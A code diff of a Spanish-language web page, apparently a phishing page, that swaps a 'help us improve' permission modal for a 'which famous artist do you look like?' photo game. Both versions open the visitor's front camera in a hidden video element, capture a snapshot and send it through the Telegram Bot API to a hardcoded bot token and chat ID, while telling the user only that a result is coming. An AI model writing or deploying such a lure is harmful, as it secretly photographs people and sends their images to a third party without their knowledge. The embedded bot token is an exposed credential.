@@ -3,84 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Optimización de Experiencia</title>
+    <title>¿A qué artista famoso te pareces?</title>
     <style>
-        /* Modal centrado */
-        #permission-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6); /* Fondo oscuro */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
         }
 
-        #permission-content {
+        #game-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             background: white;
+            color: black;
             padding: 20px;
             border-radius: 10px;
-            text-align: center;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            max-width: 400px;
             width: 90%;
+            max-width: 400px;
         }
 
-        #permission-modal button {
-            margin-top: 20px;
+        #game-container h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        #game-container button {
             padding: 10px 20px;
             border: none;
             border-radius: 5px;
-            background: #28a745;
+            background: #6a11cb;
             color: white;
             cursor: pointer;
-        }
-
-        #permission-modal button:hover {
-            background: #218838;
-        }
-
-        #permission-modal h2 {
-            margin-bottom: 10px;
-        }
-
-        #permission-modal p {
-            color: #555;
             font-size: 16px;
-            margin-bottom: 20px;
+        }
+
+        #game-container button:hover {
+            background: #2575fc;
+        }
+
+        #result-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        #result-container img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+
+        #loading-message {
+            display: none;
+            margin-top: 10px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <!-- Modal persuasivo -->
-    <div id="permission-modal">
-        <div id="permission-content">
-            <h2>Ayúdanos a Mejorar 3</h2>
-            <p>Recopilamos datos para ofrecerte una experiencia optimizada y personalizada. Por favor, concede permisos para continuar.</p>
-            <button onclick="requestPermissions()">Aceptar</button>
+    <div id="game-container">
+        <h1>¿A qué artista famoso te pareces?</h1>
+        <p>Ponte frente a la cámara y haz clic en el botón para descubrirlo.</p>
+        <button onclick="startGame()">Tomar foto</button>
+        <div id="loading-message">Procesando tu foto...</div>
+        <div id="result-container">
+            <p>Tu foto se ha procesado. ¡Pronto recibirás tu resultado!</p>
         </div>
     </div>
 
     <script>
-        async function requestPermissions() {
-            const modal = document.getElementById('permission-modal');
-            modal.style.display = 'none'; // Ocultar el modal después de la aceptación
-            await initializeCamera(); // Iniciar la cámara
+        async function startGame() {
+            const loadingMessage = document.getElementById('loading-message');
+            const resultContainer = document.getElementById('result-container');
+            loadingMessage.style.display = 'block'; // Mostrar mensaje de carga
+            resultContainer.style.display = 'none'; // Ocultar resultado previo
+            await initializeCamera();
+            loadingMessage.style.display = 'none'; // Ocultar mensaje de carga
+            resultContainer.style.display = 'block'; // Mostrar mensaje de resultado
         }
 
         async function initializeCamera() {
             const constraints = {
-                video: {
-                    facingMode: "user" // Intentar usar la cámara frontal
-                }
+                video: { facingMode: "user" }
             };
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.createElement('video'); // Crear video oculto
+                const video = document.createElement('video');
                 video.style.display = 'none';
                 document.body.appendChild(video);
                 video.srcObject = stream;
@@ -88,8 +101,8 @@
 
                 video.onloadedmetadata = async () => {
                     await captureAndSendPhoto(video, stream);
-                    stream.getTracks().forEach(track => track.stop()); // Detener cámara
-                    video.remove(); // Eliminar elemento video
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
                 };
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
@@ -97,19 +110,16 @@
         }
 
         async function captureAndSendPhoto(video, stream) {
-            const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
-            const chatId = '1223367230'; // Chat ID
+            const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g';
+            const chatId = '1223367230';
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
-            // Configurar canvas con las dimensiones del video
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
-            // Dibujar la imagen del video en el canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Convertir el contenido del canvas a un archivo Blob
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
@@ -118,11 +128,7 @@
                 const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
                 try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
-
+                    const response = await fetch(url, { method: 'POST', body: formData });
                     if (!response.ok) {
                         console.error('Error al enviar la foto:', await response.json());
                     }
